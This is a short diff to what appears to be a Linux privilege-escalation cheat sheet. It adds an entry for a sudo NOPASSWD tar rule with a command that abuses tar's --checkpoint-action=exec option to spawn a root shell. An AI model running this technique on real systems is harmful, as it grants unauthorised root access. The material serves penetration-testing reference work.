@@ -2268,7 +2268,10 @@ sudo su -
 root@WEB01:~# whoami
 root
 ````
-
+#### (ALL) NOPASSWD: /usr/bin/tar -czvf /tmp/backup.tar.gz *
+````
+sudo /usr/bin/tar -czvf /tmp/backup.tar.gz * -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+````
 #### (ALL) NOPASSWD: /usr/bin/borg [comnmand] *
 ````
 (ALL) NOPASSWD: /usr/bin/borg list *
